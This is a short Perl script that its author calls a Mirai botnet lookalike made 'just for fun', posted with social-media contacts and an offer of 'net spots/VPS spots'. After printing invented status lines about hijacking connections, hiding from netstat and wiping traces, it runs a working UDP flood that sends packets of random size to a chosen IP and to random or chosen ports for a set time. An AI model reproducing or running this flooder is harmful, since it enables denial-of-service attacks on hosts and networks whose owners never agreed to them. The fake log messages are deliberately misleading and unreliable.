#!/usr/bin/perl
 
# I Wanted To Make A Perl Script
# That Look Like A Mirai Botnet Just For Fun
# Hmu For Net Spots/VPS Spots
# Contact Info
# IG: @urerror_vanish
# PSN: urError
# SnapChat: vanishkiller
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "\n\t\t\t***Command must recieve four arguements***\n";
  print "perl Mirai.pl ip port 0000 time\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print "\e[34m[+] Login root\n\e[0m";
print "\e[34m[+] Password ******\n\e[0m";
print "\e[30m[+] \n\e[0m";
sleep 1;
print "\e[1;37m Checking Account...\n\e[0m";
print "\e[37m[+] DDOS l Succesfully Hijacked Connection\n\e[0m";
print "\e[37m[+] DDOS l Masking Connection From utmp+wtmp...\n\e[0m";
sleep 1;
print "\e[37m[+] DDOS l Hiding From Netstat...\n\e[0m";
sleep 1;
print "\e[37m[+] DDOS l Removing All Traces Of LD_PRELOAD...\n\e[0m";
sleep 1;
print "\e[37m[+] DDOS l Wiping env libc.poison.so.1\n\e[0m";
sleep 1;
print "\e[37m[+] DDOS l Wiping env libc.poison.so.2\n\e[0m";
print "\e[37m[+] DDOS l Wiping env libc.poison.so.3\n\e[0m";
print "\e[37m[+] DDOS l Wiping env libc.poison.so.4\n\e[0m";
print "\e[37m[+] DDOS l Wiping env libc.poison.so.5\n\e[0m";
print "\e[37m[+] DDOS l Setting Up Virtual Terminal...\n\e[0m";
print "\e[37m[+] DDOS 1 Your IP Has Been Logged\n\e[0m";
print "\e[37m[+] DDOS 1 Attack Logged\n\e[0m";
sleep 1;
print "\e[1;37m[!] Sharing Access Is Prohibited\n\e[0m";
sleep 1;
print "\e[1;37m[!] Do NOT Share Your Credentials Or You Will Be Banned\n\e[0m";
print "\e[36m Ready\n\e[0m";
 
 
 
 
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}